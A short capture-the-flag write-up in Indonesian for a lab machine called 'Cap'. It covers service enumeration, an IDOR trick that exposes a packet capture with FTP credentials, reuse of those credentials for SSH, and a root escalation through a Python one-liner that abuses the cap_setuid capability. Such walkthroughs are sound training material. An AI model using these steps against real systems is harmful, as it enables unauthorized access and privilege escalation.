# Machine: Cap (Linux - Easy)

## 1. Recon
- Service enumeration
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```
- Coba akses halaman web, menampilkan halaman security dashboard
- masuk menu **Security Snapshot**
- Perhatikan **id** di URL
- Ubah nilai **id** ke `0`
- Download
- Buka file pcap
- Filter **ftp** traffic
- Perhatikan bahwa ada USER dan PASS untuk service FTP

## 2. Initial access
- Coba login FTP dengan kredensial tadi
- Coba login SSH dengan kredensial yg sama
- Ok

## 3. Privilege Escalation
- Download linpeas
- jalankan
- Ada banyak output, tapi ada hal yang menarik. `python3.8` dengan setuid capabilities
- Artinya program ini dapan mengubah nilai UID nya
```
...
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
...
```
- Exploitasi, ubah UID ke 0 (root):
```
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```
- Pwned!
